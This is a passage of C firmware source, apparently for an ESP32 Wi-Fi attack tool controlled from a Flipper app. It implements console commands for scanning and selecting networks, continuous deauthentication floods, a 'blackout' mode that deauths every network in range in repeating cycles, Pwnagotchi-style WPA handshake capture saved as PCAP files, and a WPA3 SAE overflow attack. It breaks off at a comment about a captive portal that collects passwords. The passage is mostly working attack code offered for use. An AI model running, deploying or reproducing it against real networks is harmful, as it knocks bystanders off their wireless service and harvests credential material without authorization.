        // MY_LOG_INFO(TAG, "%-6d %-16s %02X:%02X:%02X:%02X:%02X:%02X   %-2d   %-4d   %s",
        //     (i+1),
        //     (const char*)ap->ssid,
        //     ap->bssid[0], ap->bssid[1], ap->bssid[2],
        //     ap->bssid[3], ap->bssid[4], ap->bssid[5],
        //     ap->primary,
        //     ap->rssi,
        //     ap->primary <= 14 ? "2.4GHz" : "5GHz");

        print_network_csv(i, ap);

    }
    MY_LOG_INFO(TAG, "Scan results printed.");
}

// --- CLI: commands ---
static int cmd_scan_networks(int argc, char **argv) {
    (void)argc; (void)argv;
    
    if (wardrive_active || wardrive_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Wardrive is active. Use 'stop' to stop it first before scanning.");
        return 1;
    }

    // Reset stop flag at the beginning of operation
    operation_stop_requested = false;
    
    // Set LED (ignore errors if LED is in invalid state)
    esp_err_t led_err = led_set_color(0, 255, 0);
    if (led_err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to set LED for scan: %s", esp_err_to_name(led_err));
    }

    esp_err_t err = start_background_scan();
    
    if (err != ESP_OK) {
        // Return LED to idle when scan failed
        led_err = led_set_idle();
        if (led_err != ESP_OK) {
            ESP_LOGW(TAG, "Failed to restore idle LED after scan failure: %s", esp_err_to_name(led_err));
        }
        
        if (err == ESP_ERR_INVALID_STATE) {
            MY_LOG_INFO(TAG, "Scan already in progress. Use 'show_scan_results' to see current results or 'stop' to cancel.");
        } else {
            ESP_LOGE(TAG, "Failed to start scan: %s", esp_err_to_name(err));
        }
        return 1;
    }
    
    g_scan_start_time_us = esp_timer_get_time();
    MY_LOG_INFO(TAG, "Background scan started (min: %u ms, max: %u ms per channel)", 
                (unsigned int)g_scan_min_channel_time, (unsigned int)g_scan_max_channel_time);
    return 0;
}

static int cmd_show_scan_results(int argc, char **argv) {
    (void)argc; (void)argv;
    
    if (g_scan_in_progress) {
        MY_LOG_INFO(TAG, "Scan still in progress... Please wait.");
        return 0;
    }
    
    if (!g_scan_done) {
        MY_LOG_INFO(TAG, "No scan has been performed yet. Use 'scan_networks' first.");
        return 0;
    }
    
    if (g_scan_count == 0) {
        MY_LOG_INFO(TAG, "No networks found in last scan.");
        return 0;
    }
    
    MY_LOG_INFO(TAG, "Showing results from last scan (%u networks found):", g_scan_count);
    print_scan_results();
    return 0;
}

static int cmd_select_networks(int argc, char **argv) {
    if (argc < 2) {
        ESP_LOGW(TAG,"Syntax: select_networks <index1> [index2] ...");
        return 1;
    }

    // Wait for scan to finish to avoid selecting with empty results
    if (g_scan_in_progress) {
        MY_LOG_INFO(TAG, "Scan in progress - waiting to finish before selecting networks...");
        int wait_loops = 0;
        // wait up to ~10s (100ms * 100) for scan to complete
        while (g_scan_in_progress && wait_loops < 100) {
            vTaskDelay(pdMS_TO_TICKS(100));
            wait_loops++;
        }
    }

    // If still no results, abort selection
    if (!g_scan_done || g_scan_count == 0) {
        ESP_LOGW(TAG,"No scan results yet. Run scan_networks and wait for completion.");
        return 1;
    }

    g_selected_count = 0;
    for (int i = 1; i < argc && g_selected_count < MAX_AP_CNT; ++i) {
        int idx = atoi(argv[i]);
        idx--;//because flipper app uses indexes from 1
        if (idx < 0 || idx >= (int)g_scan_count) {
            ESP_LOGW(TAG,"Index %d out of bounds (0..%u)", idx, g_scan_count ? (g_scan_count - 1) : 0);
            continue;
        }
        g_selected_indices[g_selected_count++] = idx;
    }
    if (g_selected_count == 0) {
        ESP_LOGW(TAG,"First, run scan_networks.");
        return 1;
    }

    char buf[500];
    int len = snprintf(buf, sizeof(buf), "Selected Networks:\n");

    for (int i = 0; i < g_selected_count; ++i) {
        const wifi_ap_record_t* ap = &g_scan_results[g_selected_indices[i]];
        
        // I assume auth is available as a string in your structure, if not - replace with appropriate field or string.
        const char* auth = authmode_to_string(ap->authmode);

        // Formatting: SSID, BSSID, Channel, Auth
        len += snprintf(buf + len, sizeof(buf) - len, "%s, %02x:%02x:%02x:%02x:%02x:%02x, Ch%d, %s%s\n",
                        (char*)ap->ssid,
                        ap->bssid[0], ap->bssid[1], ap->bssid[2],
                        ap->bssid[3], ap->bssid[4], ap->bssid[5],
                        ap->primary, auth,
                        (i + 1 == g_selected_count) ? "" : "");
    }

    vTaskDelay(pdMS_TO_TICKS(100));
    MY_LOG_INFO(TAG, "%s", buf);
    vTaskDelay(pdMS_TO_TICKS(100));

    return 0;
}


int onlyDeauth = 0;

// Deauth attack task function (runs in background)
static void deauth_attack_task(void *pvParameters) {
    (void)pvParameters;
    
    //Main loop of deauth frames sending:
    while (deauth_attack_active && 
           ((applicationState == DEAUTH) || (applicationState == DEAUTH_EVIL_TWIN) || (applicationState == EVIL_TWIN_PASS_CHECK))) {
        // Check for stop request (check at start of loop for faster response)
        if (operation_stop_requested || !deauth_attack_active) {
            MY_LOG_INFO(TAG, "Deauth attack: Stop requested, terminating...");
            operation_stop_requested = false;
            deauth_attack_active = false;
            applicationState = IDLE;
            
            // Clean up after attack (ignore LED errors)
            esp_err_t led_err = led_set_idle();
            if (led_err != ESP_OK) {
                ESP_LOGW(TAG, "Failed to restore idle LED after deauth stop: %s", esp_err_to_name(led_err));
            }
            
            break;
        }
        
        // Check if it's time for channel monitoring (every 5 minutes)
        // Only perform periodic re-scan during active deauth attacks (DEAUTH and DEAUTH_EVIL_TWIN)
        if ((applicationState == DEAUTH || applicationState == DEAUTH_EVIL_TWIN) && check_channel_changes()) {
            // Set flag to suppress logs during periodic re-scan
            periodic_rescan_in_progress = true;
            
            // Set LED to yellow during re-scan
            esp_err_t led_err = led_set_color(255, 255, 0); // Yellow
            if (led_err != ESP_OK) {
                ESP_LOGW(TAG, "Failed to set LED for periodic scan: %s", esp_err_to_name(led_err));
            }
            
            // Temporarily pause deauth for scanning
            esp_err_t scan_result = quick_channel_scan();
            if (scan_result != ESP_OK) {
                MY_LOG_INFO(TAG, "Quick channel re-scan failed: %s", esp_err_to_name(scan_result));
            }
            
            // Clear LED after re-scan (ignore errors if LED is in invalid state)
            led_err = led_clear();
            if (led_err != ESP_OK) {
                ESP_LOGW(TAG, "Failed to clear LED after periodic scan: %s", esp_err_to_name(led_err));
            }
            
            // Clear flag after re-scan completes
            periodic_rescan_in_progress = false;
        }
        
        if (applicationState == DEAUTH || applicationState == DEAUTH_EVIL_TWIN) {
            // Send deauth frames (silent mode - no UART spam)
            ESP_ERROR_CHECK(led_set_color(0, 0, 255));
            wsl_bypasser_send_deauth_frame_multiple_aps(g_scan_results, g_selected_count);
            ESP_ERROR_CHECK(led_clear());
        }
        
        // Delay and yield to allow UART console processing
        vTaskDelay(pdMS_TO_TICKS(100));
        taskYIELD(); // Give other tasks (including console) a chance to run
    }
    
    // Clean up LED after attack finishes naturally (ignore LED errors)
    esp_err_t led_err = led_set_idle();
    if (led_err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to restore idle LED after deauth task: %s", esp_err_to_name(led_err));
    }
    
    deauth_attack_active = false;
    deauth_attack_task_handle = NULL;
    
    // DO NOT clear target BSSIDs when attack ends - keep them for potential restart
    // target_bssid_count = 0;
    // memset(target_bssids, 0, sizeof(target_bssids));
    
    MY_LOG_INFO(TAG,"Deauth attack task finished.");
    
    vTaskDelete(NULL); // Delete this task
}

// Blackout attack task function (runs in background)
static void blackout_attack_task(void *pvParameters) {
    (void)pvParameters;
    
    MY_LOG_INFO(TAG, "Blackout attack task started.");
    
    // Set LED to orange for blackout attack
    esp_err_t led_err = led_set_color(255, 165, 0); // Orange
    if (led_err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to set LED for blackout attack start: %s", esp_err_to_name(led_err));
    }
    
    // Main loop: continuously scan and attack for 3 minutes each cycle
    while (blackout_attack_active && !operation_stop_requested) {
        MY_LOG_INFO(TAG, "Starting blackout cycle: scanning all networks...");
        
        // Start background scan
        esp_err_t scan_result = start_background_scan();
        if (scan_result != ESP_OK) {
            MY_LOG_INFO(TAG, "Failed to start scan: %s", esp_err_to_name(scan_result));
            vTaskDelay(pdMS_TO_TICKS(1000)); // Wait 1 second before retry
            continue;
        }
        
        // Wait for scan to complete
        int timeout = 0;
        while (g_scan_in_progress && timeout < 200 && blackout_attack_active && !operation_stop_requested) {
            vTaskDelay(pdMS_TO_TICKS(100));
            timeout++;
        }
        
        if (operation_stop_requested) {
            MY_LOG_INFO(TAG, "Blackout attack: Stop requested during scan, terminating...");
            break;
        }
        
        if (g_scan_in_progress) {
            MY_LOG_INFO(TAG, "Scan timeout, retrying...");
            vTaskDelay(pdMS_TO_TICKS(1000));
            continue;
        }
        
        if (!g_scan_done || g_scan_count == 0) {
            MY_LOG_INFO(TAG, "No scan results available, retrying...");
            vTaskDelay(pdMS_TO_TICKS(1000));
            continue;
        }
        
        MY_LOG_INFO(TAG, "Found %d networks, sorting by channel...", g_scan_count);
        
        // Sort networks by channel (ascending order)
        for (int i = 0; i < g_scan_count - 1; i++) {
            for (int j = 0; j < g_scan_count - i - 1; j++) {
                if (g_scan_results[j].primary > g_scan_results[j + 1].primary) {
                    wifi_ap_record_t temp = g_scan_results[j];
                    g_scan_results[j] = g_scan_results[j + 1];
                    g_scan_results[j + 1] = temp;
                }
            }
        }
        
        // Set all networks as selected for attack
        g_selected_count = g_scan_count;
        for (int i = 0; i < g_selected_count; i++) {
            g_selected_indices[i] = i;
        }
        
        // Save target BSSIDs for deauth attack
        save_target_bssids();
        
        MY_LOG_INFO(TAG, "Starting deauth attack on  %d networks (except whitelist) for 100 cycles...", g_selected_count);
        
        // Attack all networks for exactly 3 minutes (1800 cycles at 100ms each)
        int attack_cycles = 0;
        const int MAX_ATTACK_CYCLES = 100;
        
        while (attack_cycles < MAX_ATTACK_CYCLES && blackout_attack_active && !operation_stop_requested) {
            // Flash LED during attack (orange)
            esp_err_t led_err = led_set_color(255, 165, 0); // Orange
            if (led_err != ESP_OK) {
                ESP_LOGW(TAG, "Failed to set LED during blackout attack: %s", esp_err_to_name(led_err));
            }
            
            // Send deauth frames to all networks
            wsl_bypasser_send_deauth_frame_multiple_aps(g_scan_results, g_selected_count);
            
            // Clear LED briefly
            led_err = led_clear();
            if (led_err != ESP_OK) {
                ESP_LOGW(TAG, "Failed to clear LED during blackout attack: %s", esp_err_to_name(led_err));
            }
            
            attack_cycles++;
            vTaskDelay(pdMS_TO_TICKS(100)); // 100ms delay between attack cycles
        }
        
        if (operation_stop_requested) {
            MY_LOG_INFO(TAG, "Blackout attack: Stop requested during attack, terminating...");
            break;
        }
        
        MY_LOG_INFO(TAG, "3-minute attack cycle completed, starting new scan...");
        
        // Immediately start next scan cycle (no waiting)
    }
    
    // Clean up LED after attack finishes
    led_err = led_set_idle();
    if (led_err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to restore idle LED after blackout attack: %s", esp_err_to_name(led_err));
    }
    
    // Clean up
    blackout_attack_active = false;
    blackout_attack_task_handle = NULL;
    
    // Clear target BSSIDs
    target_bssid_count = 0;
    memset(target_bssids, 0, sizeof(target_bssids));
    
    MY_LOG_INFO(TAG, "Blackout attack task finished.");
    
    vTaskDelete(NULL); // Delete this task
}

// Helper function to check if handshake file already exists for a given SSID
static bool check_handshake_file_exists(const char *ssid) {
    char ssid_safe[33];
    
    // Sanitize SSID for filename
    strncpy(ssid_safe, ssid, sizeof(ssid_safe) - 1);
    ssid_safe[sizeof(ssid_safe) - 1] = '\0';
    for (int i = 0; ssid_safe[i]; i++) {
        if (ssid_safe[i] == ' ' || ssid_safe[i] == '/' || ssid_safe[i] == '\\') {
            ssid_safe[i] = '_';
        }
    }
    
    // Check if any PCAP file exists for this SSID
    DIR *dir = opendir("/sdcard/lab/handshakes");
    if (dir == NULL) {
        return false; // Directory doesn't exist, so no files exist
    }
    
    struct dirent *entry;
    bool found = false;
    while ((entry = readdir(dir)) != NULL) {
        // Check if filename starts with the SSID and ends with .pcap
        if (strncmp(entry->d_name, ssid_safe, strlen(ssid_safe)) == 0 &&
            strstr(entry->d_name, ".pcap") != NULL) {
            found = true;
            break;
        }
    }
    
    closedir(dir);
    return found;
}

// Cleanup function for handshake attack
static void handshake_cleanup(void) {
    MY_LOG_INFO(TAG, "Handshake attack cleanup...");
    
    // Stop any active handshake attack
    attack_handshake_stop();
    
    // Reset state
    handshake_attack_active = false;
    handshake_attack_task_handle = NULL;
    handshake_target_count = 0;
    handshake_current_index = 0;
    memset(handshake_targets, 0, sizeof(handshake_targets));
    memset(handshake_captured, 0, sizeof(handshake_captured));
    
    // Restore idle LED
    esp_err_t led_err = led_set_idle();
    if (led_err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to restore idle LED: %s", esp_err_to_name(led_err));
    }
    
    MY_LOG_INFO(TAG, "Handshake attack cleanup complete.");
}

// Quick scan all channels (both 2.4GHz and 5GHz) - 500ms per channel
static void quick_scan_all_channels(void) {
    MY_LOG_INFO(TAG, "Quick scanning all channels (2.4GHz + 5GHz)...");
    
    // Scan 2.4GHz channels
    for (int i = 0; i < NUM_CHANNELS_24GHZ && handshake_attack_active && !operation_stop_requested; i++) {
        uint8_t channel = channels_24ghz[i];
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        vTaskDelay(pdMS_TO_TICKS(500)); // 500ms per channel
        
        // Scan would happen here via background scan
        // For now we'll use the global scan results
    }
    
    // Scan 5GHz channels  
    for (int i = 0; i < NUM_CHANNELS_5GHZ && handshake_attack_active && !operation_stop_requested; i++) {
        uint8_t channel = channels_5ghz[i];
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        vTaskDelay(pdMS_TO_TICKS(500)); // 500ms per channel
    }
    
    MY_LOG_INFO(TAG, "Channel scan complete");
}

// Attack network with deauth burst (5 packets)
static void attack_network_with_burst(const wifi_ap_record_t *ap) {
    MY_LOG_INFO(TAG, "Burst attacking '%s' (Ch %d, RSSI: %d dBm)", 
                ap->ssid, ap->primary, ap->rssi);
    
    // Start attack on this network
    attack_handshake_start(ap, ATTACK_HANDSHAKE_METHOD_BROADCAST);
    
    // Send initial burst (attack_handshake_start already sends first deauth)
    // The timer will continue sending every 2s
    
    // Wait and check for handshake - 3 deauth bursts with 3s wait each
    for (int burst = 0; burst < 3 && handshake_attack_active && !operation_stop_requested; burst++) {
        // Wait 3 seconds for clients to reconnect after deauth
        for (int i = 0; i < 30 && handshake_attack_active && !operation_stop_requested; i++) {
            vTaskDelay(pdMS_TO_TICKS(100));
            
            // Check if handshake captured
            if (attack_handshake_is_complete()) {
                MY_LOG_INFO(TAG, "✓ Handshake captured for '%s' after burst #%d!", 
                           ap->ssid, burst + 1);
                
                // Wait 2s to capture any remaining frames
                vTaskDelay(pdMS_TO_TICKS(2000));
                attack_handshake_stop();
                return; // Success!
            }
        }
        
        MY_LOG_INFO(TAG, "Burst #%d complete, trying next...", burst + 1);
    }
    
    // No handshake captured after 3 bursts
    MY_LOG_INFO(TAG, "✗ No handshake for '%s' after 3 bursts", ap->ssid);
    attack_handshake_stop();
}

// Handshake attack task - Pwnagotchi-style hybrid approach
static void handshake_attack_task(void *pvParameters) {
    (void)pvParameters;
    
    MY_LOG_INFO(TAG, "Handshake attack task started.");
    MY_LOG_INFO(TAG, "Mode: %s", handshake_selected_mode ? "Selected networks only" : "Scan all networks periodically");
    
    // Set LED to cyan for handshake attack
    esp_err_t led_err = led_set_color(0, 255, 255); // Cyan
    if (led_err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to set LED for handshake attack: %s", esp_err_to_name(led_err));
    }
    
    int64_t last_scan_time = 0;
    const int64_t SCAN_INTERVAL_US = 5 * 60 * 1000000; // 5 minutes in microseconds
    
    while (handshake_attack_active && !operation_stop_requested) {
        // In non-selected mode, do periodic scans
        if (!handshake_selected_mode) {
            int64_t current_time = esp_timer_get_time();
            if (current_time - last_scan_time >= SCAN_INTERVAL_US || handshake_target_count == 0) {
                MY_LOG_INFO(TAG, "Performing periodic scan for networks...");
                
                // Start background scan
                esp_err_t scan_result = start_background_scan();
                if (scan_result != ESP_OK) {
                    MY_LOG_INFO(TAG, "Failed to start scan: %s", esp_err_to_name(scan_result));
                    vTaskDelay(pdMS_TO_TICKS(5000));
                    continue;
                }
                
                // Wait for scan to complete
                int timeout = 0;
                while (g_scan_in_progress && timeout < 200 && handshake_attack_active && !operation_stop_requested) {
                    vTaskDelay(pdMS_TO_TICKS(100));
                    timeout++;
                }
                
                if (operation_stop_requested) {
                    MY_LOG_INFO(TAG, "Stop requested during scan, terminating...");
                    break;
                }
                
                if (g_scan_in_progress || !g_scan_done || g_scan_count == 0) {
                    MY_LOG_INFO(TAG, "Scan failed or no results, retrying in 5 seconds...");
                    vTaskDelay(pdMS_TO_TICKS(5000));
                    continue;
                }
                
                // Copy scan results to handshake targets
                handshake_target_count = (g_scan_count < MAX_AP_CNT) ? g_scan_count : MAX_AP_CNT;
                memcpy(handshake_targets, g_scan_results, handshake_target_count * sizeof(wifi_ap_record_t));
                handshake_current_index = 0;
                
                MY_LOG_INFO(TAG, "Found %d networks to attack", handshake_target_count);
                last_scan_time = current_time;
            }
        }
        
        // Check if we're done with all selected networks
        if (handshake_selected_mode) {
            bool all_captured = true;
            for (int i = 0; i < handshake_target_count; i++) {
                if (!handshake_captured[i]) {
                    all_captured = false;
                    break;
                }
            }
            
            if (all_captured) {
                MY_LOG_INFO(TAG, "All selected networks have been captured! Attack complete.");
                break;
            }
        }
        
        // Pwnagotchi-style attack strategy
        if (handshake_selected_mode) {
            MY_LOG_INFO(TAG, "===== Selected Networks Mode =====");
            MY_LOG_INFO(TAG, "Attacking %d selected networks in loop until all captured", handshake_target_count);
            MY_LOG_INFO(TAG, "Strategy: Deauth burst (5 packets) every 1s, 3 bursts per network");
        } else {
            MY_LOG_INFO(TAG, "===== Scan-All Mode (Pwnagotchi-style) =====");
            MY_LOG_INFO(TAG, "1. Quick scan ALL channels (2.4GHz + 5GHz)");
            MY_LOG_INFO(TAG, "2. Attack ALL networks found (no filtering)");
            MY_LOG_INFO(TAG, "3. Deauth burst (5 packets) every 1s, 3 bursts per network");
            
            // PHASE 1: Quick scan all channels (only in scan-all mode)
            MY_LOG_INFO(TAG, "");
            MY_LOG_INFO(TAG, "===== PHASE 1: Quick Channel Scan =====");
            
            int total_channels = NUM_CHANNELS_24GHZ + NUM_CHANNELS_5GHZ;
            MY_LOG_INFO(TAG, "Scanning %d channels (%d x 2.4GHz + %d x 5GHz) @ 500ms each...",
                       total_channels, NUM_CHANNELS_24GHZ, NUM_CHANNELS_5GHZ);
            
            // This will take about: (13 + 25) * 0.5s = 19 seconds
            quick_scan_all_channels();
        }
        
        // PHASE 2: Attack networks
        MY_LOG_INFO(TAG, "");
        if (handshake_selected_mode) {
            MY_LOG_INFO(TAG, "===== Attacking Selected Networks =====");
        } else {
            MY_LOG_INFO(TAG, "===== PHASE 2: Attack All Networks =====");
        }
        MY_LOG_INFO(TAG, "Attacking %d networks...", handshake_target_count);
        
        // Attack all networks regardless of signal strength
        int attacked_count = 0;
        int captured_count = 0;
        
        for (int i = 0; i < handshake_target_count && handshake_attack_active && !operation_stop_requested; i++) {
            wifi_ap_record_t *ap = &handshake_targets[i];
            
            // Skip if already captured
            if (handshake_captured[i]) {
                continue;
            }
            
            // Check if file already exists
            if (check_handshake_file_exists((const char*)ap->ssid)) {
                MY_LOG_INFO(TAG, "[%d/%d] Skipping '%s' - PCAP already exists", 
                           i + 1, handshake_target_count, (const char*)ap->ssid);
                handshake_captured[i] = true;
                captured_count++;
                continue;
            }
            
            attacked_count++;
            MY_LOG_INFO(TAG, "");
            MY_LOG_INFO(TAG, ">>> [%d/%d] Attacking '%s' (Ch %d, RSSI: %d dBm) <<<", 
                       i + 1, handshake_target_count, (const char*)ap->ssid, ap->primary, ap->rssi);
            
            // Attack with burst strategy
            attack_network_with_burst(ap);
            
            // Check if captured
            if (attack_handshake_is_complete()) {
                handshake_captured[i] = true;
                captured_count++;
                MY_LOG_INFO(TAG, "✓✓✓ Handshake #%d captured! ✓✓✓", captured_count);
            }
            
            // Delay before next network (channel stabilization)
            if (i < handshake_target_count - 1) {
                MY_LOG_INFO(TAG, "Cooling down 2s before next network...");
                vTaskDelay(pdMS_TO_TICKS(2000));
            }
        }
        
        MY_LOG_INFO(TAG, "");
        MY_LOG_INFO(TAG, "===== Attack Cycle Complete =====");
        MY_LOG_INFO(TAG, "Total networks: %d", handshake_target_count);
        MY_LOG_INFO(TAG, "Networks attacked this cycle: %d", attacked_count);
        MY_LOG_INFO(TAG, "Handshakes captured so far: %d", captured_count);
        
        // Check if all selected networks captured (for selected mode)
        if (handshake_selected_mode) {
            bool all_done = true;
            int remaining = 0;
            for (int i = 0; i < handshake_target_count; i++) {
                if (!handshake_captured[i]) {
                    all_done = false;
                    remaining++;
                }
            }
            
            if (all_done) {
                MY_LOG_INFO(TAG, "✓✓✓ All selected networks captured! Attack complete. ✓✓✓");
                break;
            }
            
            // Continue looping until all captured
            MY_LOG_INFO(TAG, "Selected mode: %d networks still need handshakes, repeating attack cycle...", remaining);
            vTaskDelay(pdMS_TO_TICKS(3000)); // Small delay before next loop
        } else {
            // In non-selected mode, wait before next scan cycle
            MY_LOG_INFO(TAG, "Scan-all mode: Waiting for next scan interval...");
            vTaskDelay(pdMS_TO_TICKS(10000)); // Wait 10 seconds before checking scan interval
        }
    }
    
    // Cleanup
    handshake_cleanup();
    
    MY_LOG_INFO(TAG, "Handshake attack task finished.");
    vTaskDelete(NULL);
}

static int cmd_start_deauth(int argc, char **argv) {
    onlyDeauth = 1;
    return cmd_start_evil_twin(argc, argv);
}

static int cmd_start_handshake(int argc, char **argv) {
    // Check if handshake attack is already running
    if (handshake_attack_active || handshake_attack_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Handshake attack already running. Use 'stop' to stop it first.");
        return 1;
    }

    // Optional: allow passing indexes directly (like "start_handshake 13 14")
    if (argc > 1) {
        // If a scan is still running, wait briefly for completion
        if (g_scan_in_progress) {
            MY_LOG_INFO(TAG, "Scan in progress - waiting to finish before starting handshake...");
            int wait_loops = 0;
            while (g_scan_in_progress && wait_loops < 100) { // ~10s max
                vTaskDelay(pdMS_TO_TICKS(100));
                wait_loops++;
            }
        }

        if (!g_scan_done || g_scan_count == 0) {
            MY_LOG_INFO(TAG, "No scan results yet. Run scan_networks first.");
            return 1;
        }

        // Build selection from provided indexes (1-based like UI)
        g_selected_count = 0;
        for (int i = 1; i < argc && g_selected_count < MAX_AP_CNT; ++i) {
            int idx = atoi(argv[i]) - 1;
            if (idx < 0 || idx >= (int)g_scan_count) {
                ESP_LOGW(TAG,"Index %d out of bounds (1..%u)", idx + 1, g_scan_count);
                continue;
            }
            g_selected_indices[g_selected_count++] = idx;
        }

        if (g_selected_count == 0) {
            MY_LOG_INFO(TAG, "No valid targets from arguments. Aborting handshake.");
            return 1;
        }
    }
    
    // Reset stop flag
    operation_stop_requested = false;
    
    // Initialize state
    handshake_target_count = 0;
    handshake_current_index = 0;
    memset(handshake_targets, 0, sizeof(handshake_targets));
    memset(handshake_captured, 0, sizeof(handshake_captured));
    
    // Check if networks were selected
    if (g_selected_count > 0) {
        // Selected networks mode
        handshake_selected_mode = true;
        handshake_target_count = g_selected_count;
        
        MY_LOG_INFO(TAG, "Starting WPA Handshake Capture - Selected Networks Mode");
        MY_LOG_INFO(TAG, "Targets: %d network(s)", g_selected_count);
        
        // Copy selected networks to handshake targets
        for (int i = 0; i < g_selected_count; i++) {
            int idx = g_selected_indices[i];
            memcpy(&handshake_targets[i], &g_scan_results[idx], sizeof(wifi_ap_record_t));
            MY_LOG_INFO(TAG, "  [%d] SSID='%s' Ch=%d", 
                       i + 1, (const char*)handshake_targets[i].ssid, handshake_targets[i].primary);
        }
        
        MY_LOG_INFO(TAG, "Will spend max 40s on each network");
        MY_LOG_INFO(TAG, "Will stop automatically when all networks captured");
    } else {
        // Scan-all mode
        handshake_selected_mode = false;
        
        MY_LOG_INFO(TAG, "Starting WPA Handshake Capture - Scan All Mode");
        MY_LOG_INFO(TAG, "No networks selected - will scan and attack all networks");
        MY_LOG_INFO(TAG, "Periodic scan every 5 minutes");
        MY_LOG_INFO(TAG, "Will run until 'stop' command");
        
        // Do initial scan
        if (g_scan_count > 0) {
            handshake_target_count = (g_scan_count < MAX_AP_CNT) ? g_scan_count : MAX_AP_CNT;
            memcpy(handshake_targets, g_scan_results, handshake_target_count * sizeof(wifi_ap_record_t));
            MY_LOG_INFO(TAG, "Using %d networks from last scan", handshake_target_count);
        } else {
            MY_LOG_INFO(TAG, "No previous scan results - will scan on startup");
        }
    }
    
    MY_LOG_INFO(TAG, "Method: Broadcast deauth + passive capture");
    MY_LOG_INFO(TAG, "Handshakes will be saved automatically to SD card");
    MY_LOG_INFO(TAG, "Use 'stop' to stop the attack");
    
    // Start handshake attack task
    handshake_attack_active = true;
    BaseType_t result = xTaskCreate(
        handshake_attack_task,
        "handshake_attack",
        8192,  // Stack size
        NULL,
        5,     // Priority
        &handshake_attack_task_handle
    );
    
    if (result != pdPASS) {
        MY_LOG_INFO(TAG, "Failed to create handshake attack task!");
        handshake_attack_active = false;
        return 1;
    }
    
    return 0;
}

static int cmd_save_handshake(int argc, char **argv) {
    // Avoid compiler warnings
    (void)argc; (void)argv;
    
    MY_LOG_INFO(TAG, "Manually saving handshake to SD card...");
    
    if (attack_handshake_save_to_sd()) {
        MY_LOG_INFO(TAG, "✓ Handshake saved successfully!");
        MY_LOG_INFO(TAG, "Files saved to: /sdcard/lab/handshakes/");
        return 0;
    } else {
        MY_LOG_INFO(TAG, "✗ Failed to save - no complete 4-way handshake captured");
        MY_LOG_INFO(TAG, "Make sure you captured all 4 messages of the handshake");
        return 1;
    }
}

static int cmd_start_sae_overflow(int argc, char **argv) {
    //avoid compiler warnings:
    (void)argc; (void)argv;
    
    // Check if SAE attack is already running
    if (sae_attack_active || sae_attack_task_handle != NULL) {
        MY_LOG_INFO(TAG, "SAE overflow attack already running. Use 'stop' to stop it first.");
        return 1;
    }
    
    // Reset stop flag at the beginning of operation
    operation_stop_requested = false;

    if (g_selected_count == 1) {
        applicationState = SAE_OVERFLOW;
        int idx = g_selected_indices[0];
        const wifi_ap_record_t *ap = &g_scan_results[idx];
        
        // Set LED
        esp_err_t led_err = led_set_color(255, 0, 0);
        if (led_err != ESP_OK) {
            ESP_LOGW(TAG, "Failed to set LED for SAE overflow: %s", esp_err_to_name(led_err));
        }
        
        MY_LOG_INFO(TAG,"WPA3 SAE Overflow Attack");
        MY_LOG_INFO(TAG,"Target: SSID='%s' Ch=%d Auth=%d", (const char*)ap->ssid, ap->primary, ap->authmode);
        MY_LOG_INFO(TAG,"SAE attack started. Use 'stop' to stop.");
        
        // Allocate memory for ap_record to pass to task
        wifi_ap_record_t *ap_copy = (wifi_ap_record_t *)malloc(sizeof(wifi_ap_record_t));
        if (ap_copy == NULL) {
            MY_LOG_INFO(TAG, "Failed to allocate memory for SAE attack!");
            applicationState = IDLE;
            return 1;
        }
        memcpy(ap_copy, ap, sizeof(wifi_ap_record_t));
        
        // Start SAE attack in background task
        sae_attack_active = true;
        BaseType_t result = xTaskCreate(
            sae_attack_task,
            "sae_task",
            8192,  // Larger stack size for crypto operations
            ap_copy,
            5,     // Priority
            &sae_attack_task_handle
        );
        
        if (result != pdPASS) {
            MY_LOG_INFO(TAG, "Failed to create SAE overflow task!");
            free(ap_copy);
            sae_attack_active = false;
            applicationState = IDLE;
            return 1;
        }
        
    } else {
        MY_LOG_INFO(TAG,"SAE Overflow: you need to select exactly ONE network (use select_networks).");
    }
    return 0;
}

// Blackout attack command - scans all networks every 3 minutes, sorts by channel, attacks all
static int cmd_start_blackout(int argc, char **argv) {
    //avoid compiler warnings:
    (void)argc; (void)argv;
    
    // Check if blackout attack is already running
    if (blackout_attack_active || blackout_attack_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Blackout attack already running. Use 'stop' to stop it first.");
        return 1;
    }
    
    // Reset stop flag at the beginning of operation
    operation_stop_requested = false;
    
    MY_LOG_INFO(TAG, "Starting blackout attack - scanning all networks every 3 minutes...");
    MY_LOG_INFO(TAG, "Networks will be sorted by channel for efficient attacking.");
    MY_LOG_INFO(TAG, "Use 'stop' to stop the attack.");
    
    // Start blackout attack in background task
    blackout_attack_active = true;
    BaseType_t result = xTaskCreate(
        blackout_attack_task,
        "blackout_task",
        4096,  // Stack size
        NULL,
        5,     // Priority
        &blackout_attack_task_handle
    );
    
    if (result != pdPASS) {
        MY_LOG_INFO(TAG, "Failed to create blackout attack task!");
        blackout_attack_active = false;
        return 1;
    }
    
    return 0;
}

static void boot_button_task(void *arg) {
    const TickType_t delay_ticks = pdMS_TO_TICKS(BOOT_BUTTON_POLL_DELAY_MS);
    const TickType_t long_press_ticks = pdMS_TO_TICKS(BOOT_BUTTON_LONG_PRESS_MS);
    bool prev_pressed = (gpio_get_level(BOOT_BUTTON_GPIO) == 0);
    TickType_t press_start_tick = prev_pressed ? xTaskGetTickCount() : 0;
    bool long_action_triggered = false;

    while (1) {
        bool pressed = (gpio_get_level(BOOT_BUTTON_GPIO) == 0);
        TickType_t now = xTaskGetTickCount();

        if (pressed) {
            if (!prev_pressed) {
                // Rising edge - start tracking the press
                press_start_tick = now;
                long_action_triggered = false;
            } else if (!long_action_triggered && (now - press_start_tick) >= long_press_ticks) {
                long_action_triggered = true;
                printf("Boot Long Pressed\n");
                fflush(stdout);
                boot_handle_action(true);
            }
        } else if (prev_pressed) {
            // Falling edge - button released
            if (!long_action_triggered) {
                printf("Boot Pressed\n");
                fflush(stdout);
                boot_handle_action(false);
            }
            long_action_triggered = false;
        }

        prev_pressed = pressed;
        vTaskDelay(delay_ticks);
    }
}

/*
0) Starts captive portal to collect password
1) Starts a stream of deauth packets sent to all target networks. 
